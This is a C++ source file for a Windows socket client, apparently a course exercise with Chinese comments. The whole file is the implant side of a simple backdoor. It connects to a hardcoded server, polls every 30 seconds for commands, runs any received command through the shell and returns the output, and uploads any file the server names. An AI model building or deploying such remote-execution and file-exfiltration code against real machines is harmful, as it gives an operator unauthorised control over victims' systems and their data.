// Client.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <winsock2.h>

using namespace std;

#pragma comment(lib, "ws2_32.lib")

#define REMOTE_PORT			4000
#define REMOTE_IP_ADDRESS "127.0.0.1"

#define CMD_NULL		0
#define CMD_CMD			1
#define CMD_DOWNLOAD	2

#define MAX_CMD_LEN		256
#define MAC_ADDR_LEN	18
#define DEFAULT_BUFLEN  1024
char MacAddr[MAC_ADDR_LEN];
char cmdbuffer[DEFAULT_BUFLEN] = { 0 };          //用1024的空间来存储输出的内容，只要不是显示文件内容，一般情况下是够用了。  

int getFileSizeSystemCall(char * strFileName)
{
	struct stat temp;
	stat(strFileName, &temp);
	return temp.st_size;
}

void init()
{
	// get mac address
	memset(MacAddr, 0, MAC_ADDR_LEN);
	GUID uuid;
	CoCreateGuid(&uuid);
	// Spit the address out
	sprintf(MacAddr, "%02X:%02X:%02X:%02X:%02X:%02X",
		uuid.Data4[2], uuid.Data4[3], uuid.Data4[4],
		uuid.Data4[5], uuid.Data4[6], uuid.Data4[7]);
	cout << "本机mac地址为"<<MacAddr << endl;
	return;
}

int recvn(SOCKET s, char* recvbuf, unsigned int fixedlen)
{
	int iResult;    //存储单次recv操作的返回值
	int cnt;         //用于统计相对于固定长度，剩余多少字节尚未接收
	cnt = fixedlen;
	while ( cnt > 0 ) {
		iResult = recv(s, recvbuf, cnt, 0);
		if ( iResult < 0 ){
			//数据接收出现错误，返回失败
			printf("接收发生错误: %d\n", WSAGetLastError());
			return -1;
		}
		if ( iResult == 0 ){
			//对方关闭连接，返回已接收到的小于fixedlen的字节数
			printf("连接关闭\n");
			return fixedlen - cnt;
		}
		//printf("接收到的字节数: %d\n", iResult);
		//接收缓存指针向后移动
		recvbuf +=iResult;
		//更新cnt值
		cnt -=iResult;         
	}
	return fixedlen;
}

char *execute_cmd(char *strCmd)
{
	return "";
}

bool execmd(char* cmd, char* result) {
	char buffer[DEFAULT_BUFLEN];                         //定义缓冲区                        
	FILE* pipe = _popen(cmd, "r");            //打开管道，并执行命令 
	if (!pipe)
		return 0;                      //返回0表示运行失败 

	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe)) {             //将管道输出到result中 
			strcat(result, buffer);
		}
	}
	_pclose(pipe);                            //关闭管道 
	cout << result << endl;
	return 1;                                 //返回1表示运行成功 
}

int main(int argc, char * argv[])
{
	WSADATA Ws;
	SOCKET ClientSocket;
	struct sockaddr_in ServerAddr;
	int Ret = 0;
	int AddrLen = 0;
	HANDLE hThread = NULL;
	char SendBuffer[MAX_PATH];
	unsigned int reclen;
	char CmdBuff[MAX_CMD_LEN];
	char strCmdNo[2];
	char *pStrCmd;
	int CmdNo;
	
	init();//get mac

	//Init Windows Socket
	if ( WSAStartup(MAKEWORD(2,2), &Ws) != 0 )
	{
		cout<<"Init Windows Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}
	//Create Socket
	ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( ClientSocket == INVALID_SOCKET )
	{
		cout<<"Create Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_addr.s_addr = inet_addr(REMOTE_IP_ADDRESS);
	ServerAddr.sin_port = htons(REMOTE_PORT);
	memset(ServerAddr.sin_zero, 0, 8);

	Ret = connect(ClientSocket,(struct sockaddr*)&ServerAddr, sizeof(ServerAddr));
	if ( Ret == SOCKET_ERROR )
	{
		cout<<"Connect Error::"<<GetLastError()<<endl;
		return -1;
	}
	else
	{
		cout << endl;
		cout << "                                           *------------------------------*" << endl;
		cout << "                                           |        成功启动客户端        |" << endl;
		cout << "                                           |  mac地址 ：" << MacAddr << " |" << endl;
		cout << "                                           |  IP地址  ：" << inet_ntoa(ServerAddr.sin_addr) << "         |" << endl;
		cout << "                                           |  端口地址：" << ntohs(ServerAddr.sin_port) << "              |" << endl;
		cout << "                                           *------------------------------*" << endl;
	}

	cout << "开始与服务器进行交互" << endl;
	while ( true )
	{
		//cin.getline(SendBuffer, sizeof(SendBuffer));
		// send mac address
		Ret = send(ClientSocket, MacAddr, MAC_ADDR_LEN, 0);
		cout << "发送mac地址：" << MacAddr << endl;
		if ( Ret != MAC_ADDR_LEN )
		{
			cout<<"Send Info Error::"<<GetLastError()<<endl;
			break;
		}

		//
		// recv cmd information
		//
		Ret = recvn(ClientSocket, ( char * )&reclen, sizeof( unsigned int ));
		if ( Ret !=sizeof( unsigned int ) )
		{
			printf("接收异常");
			break;
		}
		//转换网络字节顺序到主机字节顺序
		reclen = ntohl( reclen );
		if(reclen>2&&reclen<100)cout << "接收到" << reclen-2 <<"字节命令"<< endl;

		//
		// recv cmd information
		//
		memset(CmdBuff, 0, MAX_CMD_LEN);
		if(reclen > 0)
		{
			bool suc;
			char * error = "客户端执行该命令时返回异常！\n";
			Ret = recvn(ClientSocket, CmdBuff, reclen);
			if(Ret != reclen)
				break;
			cout << "执行指令！" << endl;
			strCmdNo[0] = CmdBuff[0];
			strCmdNo[1] = '\0';
			CmdNo = atoi(strCmdNo);
			pStrCmd = CmdBuff + 2;
			cout << "指令类型为"<<CmdNo<<endl;
			switch(CmdNo)
			{
			case CMD_CMD:
				printf("cmd: %s\n", pStrCmd);
				// execute cmd and send result to server
				memset(cmdbuffer, 0, sizeof(cmdbuffer));
				suc = execmd(pStrCmd,cmdbuffer);
				int iResult;
				if (suc) iResult = send(ClientSocket, cmdbuffer, DEFAULT_BUFLEN, 0);
				else iResult = send(ClientSocket, error, DEFAULT_BUFLEN, 0);
				if (iResult == SOCKET_ERROR) {
					printf("发送失败！错误编号: %d\n", WSAGetLastError());
					closesocket(ClientSocket);
					WSACleanup();
					return 1;
				}
				break;

			case CMD_DOWNLOAD:
				// read file and send to server
				printf("download file: %s\n", pStrCmd);
				
				char sendbuf[DEFAULT_BUFLEN];
				FILE *file = NULL;
				char *filename = pStrCmd;
				file = fopen(filename, "rb");
				int filelen = getFileSizeSystemCall(filename);
				cout << "数据长度为  " << filelen << endl;

				int invfilelen = htonl(filelen);
				cout << "数据长度转换为网络字节序为  " << invfilelen << endl;
				/*char *filelenchar;
				filelenchar = (char *)(&invfilelen);*/

				iResult = send(ClientSocket, (char *)(&invfilelen), 4, 0);//发送文件长度

				int tosendlen = filelen;

				// 发送缓冲区中的测试数据
				while (tosendlen > 0)
				{
					cout << "还有" << tosendlen << "个字节需要发送" << endl;
					fread(sendbuf, 1, DEFAULT_BUFLEN, file);
					int iSend = DEFAULT_BUFLEN;
					if (tosendlen < DEFAULT_BUFLEN) iSend = tosendlen;
					iResult = send(ClientSocket, sendbuf, iSend, 0);
					printf("装填成功！\n");

					if (iResult == SOCKET_ERROR) {
						printf("发送失败！错误编号: %d\n", WSAGetLastError());
						closesocket(ClientSocket);
						WSACleanup();
						return 1;
					}
					//printf("发射成功: %s(%ld)\n\n", sendbuf, iResult);
					tosendlen -= iResult;
				}

				fclose(file);

				cout << "文件上载成功！" << endl;

				break;
			}
		}
		
		Sleep(30*1000);
	}

	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}